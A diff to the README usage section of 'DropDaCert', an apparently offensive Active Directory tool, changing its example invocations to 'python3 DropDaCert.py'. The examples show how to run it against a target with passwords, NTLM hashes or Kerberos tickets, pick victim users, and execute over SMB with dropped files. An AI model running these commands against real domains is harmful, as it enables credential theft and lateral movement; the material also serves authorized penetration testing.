@@ -55,39 +55,39 @@ This installs [certipy](https://github.com/ly4k/Certipy) and [psexecsvc](https:/
 ## Usage
 
 ```
-DropDaCert [[domain/]username[:password]@]target -ca HOST\CA -dc DC_IP [options]
+python3 DropDaCert.py [[domain/]username[:password]@]target -ca HOST\CA -dc DC_IP [options]
 ```
 
 ### Examples
 
 ```bash
 # Password auth, interactive session picker
-DropDaCert administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1
+python3 DropDaCert.py administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1
 
 # Target a specific user
-DropDaCert administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1 -tu jsmith
+python3 DropDaCert.py administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1 -tu jsmith
 
 # Domain auth
-DropDaCert corp.local/admin:'Pass'@server01 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1
+python3 DropDaCert.py corp.local/admin:'Pass'@server01 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1
 
 # NTLM hash
-DropDaCert administrator@10.0.0.5 -H :abc123def... -ca 'CA01\CA' -dc 10.0.0.1
+python3 DropDaCert.py administrator@10.0.0.5 -H :abc123def... -ca 'CA01\CA' -dc 10.0.0.1
 
 # Kerberos
-DropDaCert corp.local/admin:'Pass'@server01 -k -ca 'CA01\CA' -dc 10.0.0.1
+python3 DropDaCert.py corp.local/admin:'Pass'@server01 -k -ca 'CA01\CA' -dc 10.0.0.1
 
 # Kerberos with ccache
 export KRB5CCNAME=admin.ccache
-DropDaCert corp.local/admin@server01 -k -ca 'CA01\CA' -dc 10.0.0.1
+python3 DropDaCert.py corp.local/admin@server01 -k -ca 'CA01\CA' -dc 10.0.0.1
 
 # SMB exec (no WinRM needed)
-DropDaCert admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method smb
+python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method smb
 
 # Manual mode — generate files and print instructions only
-DropDaCert admin@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method manual -tu jsmith
+python3 DropDaCert.py admin@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method manual -tu jsmith
 
 # Non-admin target (C:\Users\Public + cmd wrapper)
-DropDaCert admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 -tu lowpriv \
+python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 -tu lowpriv \
   --drop-dir 'C:\Users\Public' --exec-wrapper cmd
 ```
 
